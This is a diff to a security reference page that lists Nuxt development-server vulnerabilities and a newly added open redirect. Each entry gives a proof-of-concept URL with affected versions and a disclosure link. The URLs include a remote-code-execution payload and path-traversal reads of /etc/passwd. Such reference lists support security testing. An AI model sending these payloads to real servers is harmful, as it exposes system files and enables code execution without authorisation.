@@ -19,20 +19,26 @@ toc: true
 
 ## Vulnerabilities
 
-### Remote Code execution 
+### Remote Code Execution 
 
 - `http://localhost:3000/__nuxt_component_test__/?path=data%3Atext%2Fjavascript%2Cconsole%2Elog%28%22hello%21%22%29%3B`
 - Version: <= v3.4.0-2 (development server)
 - [Huntr -  RCE in developer mode in nuxt/nuxt](https://huntr.dev/bounties/1eb74fd8-0258-4c1f-a904-83b52e373a87/)
 
-### Abritrary file read
+### Abritrary File Read
 
 - `http://localhost:3000/__nuxt_vite_node__/module//bin/passwd`
 - Version: 3.0.0-RC8 - 3.4.1 (development server)
 - [Huntr - (Almost) Arbitary File Read on Development Server in nuxt/nuxt](https://huntr.dev/bounties/7840cd32-af15-40cb-a148-7ef3dff4a0c2/)
 
-### Path traversal
+### Path Traversal
 
 - http://localhost:3000/_nuxt/@fs/etc/passwd
 - Version: <= rc12 (development server)
 - [Huntr - Dev mode Path traversal in nuxt/framework](https://huntr.dev/bounties/4849af83-450c-435e-bc0b-71705f5be440/)
+
+### Open Redirect
+
+- https://nuxtjs.org///bing.com
+- Version: <= 2.15.7
+- [Github Issues - Three slashes linking to external website](https://github.com/nuxt/nuxt/issues/9992)
